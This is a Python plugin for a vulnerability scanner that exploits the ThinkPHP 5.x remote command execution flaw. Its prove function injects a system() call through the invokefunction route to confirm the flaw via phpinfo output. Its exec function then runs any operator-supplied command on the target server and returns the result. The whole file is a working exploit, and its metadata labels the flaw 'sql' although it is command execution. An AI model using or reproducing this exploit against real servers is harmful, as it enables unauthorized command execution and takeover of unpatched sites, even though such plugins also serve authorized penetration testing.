#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'
from urllib import parse
# https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ
# http://www.vulnspy.com/cn-thinkphp-5.x-rce/thinkphp_5.x_(v5.0.23%E5%8F%8Av5.1.31%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC)_%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88getshell%EF%BC%89/
# 5.x < 5.1.31, <= 5.0.23
def info(data):
    info = {
        "name": "thinkphp 5.1.31 getshell",
        "info": "thinkphp 5.1.31 getshell",
        "level": "high",
        "type": "sql",
    }
    return info

def prove(data):
    init(data,'web')
    if data['base_url']:
        for path in ['','public/']:
            url = data[
                      'base_url'] +path+ "index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'"
            res = curl('get', url)
            # if res != None:
            #     print(res.text)
            if res != None and res.status_code == 200 and 'PHP Version' in res.text:
                data['flag'] = 1
                data['data'].append({"flag": url})
                data['res'].append({"info": url, "key": "thinkphp 5.1.31 getshell"})
    return data

def exec(data):
    init(data,'web')
    if data['base_url']:
        url = data[
                  'base_url'] + "index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%s" %parse.quote_plus(data['cmd'])
        res = curl('get', url)
        if res != None and res.status_code == 200:
            data['flag'] = 1
            data['data'].append({"flag": url})
            data['res'].append({"info": res.text, "key": "thinkphp 5.1.31 getshell"})
    return data
